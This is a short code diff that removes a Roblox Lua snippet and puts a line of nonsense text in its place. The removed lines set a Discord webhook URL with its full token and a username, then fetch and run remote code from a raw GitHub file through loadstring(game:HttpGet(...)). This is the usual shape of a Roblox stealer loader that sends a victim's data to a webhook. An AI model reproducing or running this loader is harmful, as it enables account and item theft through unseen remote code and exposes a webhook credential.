@@ -1,4 +1,1 @@
-Webhook = "https://discord.com/api/webhooks/1344090473668542464/7Eyn6ObSK4ikPXYVELf4dN7pwssz36dnPlvdzACoQKLEfYzmfKoIgJjtZb3ls1Xrjjzk" -- << Ur webhook
-Username = "olijus25towerbattles" -- << Ur username
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/wow1/refs/heads/main/f222",true))()
+asdfasdadasd
